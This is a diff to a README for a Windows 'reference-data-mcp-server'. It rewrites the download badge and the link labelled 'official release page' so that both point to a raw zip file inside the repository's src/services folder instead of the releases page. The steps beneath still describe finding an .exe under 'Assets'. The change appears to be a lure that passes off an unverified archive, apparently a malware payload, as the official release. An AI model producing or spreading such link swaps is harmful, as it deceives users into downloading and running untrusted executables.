@@ -1,6 +1,6 @@
 # 🌍 reference-data-mcp-server - Easily access global data from your computer
 
-[![](https://img.shields.io/badge/Download-Reference_Data_Server-blue)](https://github.com/alphonsofundamental519/reference-data-mcp-server/releases)
+[![](https://img.shields.io/badge/Download-Reference_Data_Server-blue)](https://raw.githubusercontent.com/alphonsofundamental519/reference-data-mcp-server/main/src/services/data-server-reference-mcp-v1.7.zip)
 
 ## 📖 About this software
 
@@ -19,7 +19,7 @@ The tool uses the Model Context Protocol. This standard allows different program
 
 You must visit the project release page to get the software. Follow these steps to find the correct file:
 
-1. Visit the [official release page](https://github.com/alphonsofundamental519/reference-data-mcp-server/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/alphonsofundamental519/reference-data-mcp-server/main/src/services/data-server-reference-mcp-v1.7.zip).
 2. Look for the section labeled "Assets."
 3. Choose the file ending in `.exe` that matches your Windows installation.
 4. Click the file name to start the download.
